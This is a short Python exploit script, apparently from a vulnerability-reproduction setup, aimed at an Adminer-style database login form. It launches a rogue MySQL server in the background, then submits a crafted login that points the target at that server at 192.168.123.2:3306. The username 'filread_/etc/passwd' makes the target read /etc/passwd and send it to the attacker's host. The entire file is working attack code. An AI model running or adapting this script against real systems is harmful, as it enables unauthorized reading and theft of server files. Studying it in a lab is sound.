import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


print(target_url)


setup_token = ""


def build_mysql():
    os.system(
        "cd MySQL_Fake_Server-master && /bin/bash -c 'nohup python server.py 2>&1 > ./mysql_logs &'"
    )


def execute():
    res = requests.post(
        f"{target_url}",
        data={
            "auth[driver]": "server",
            "auth[server]": "192.168.123.2:3306",
            "auth[username]": "filread_/etc/passwd",
            "auth[password]": "",
            "auth[db]": "",
        },
    )
    print(res.text)


cmds = [build_mysql, execute]


all_time = 5
sleep_time = all_time // len(cmds)

for cmd in cmds:
    print(f"sleeping for {sleep_time}.")
    time.sleep(sleep_time)
    cmd()

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
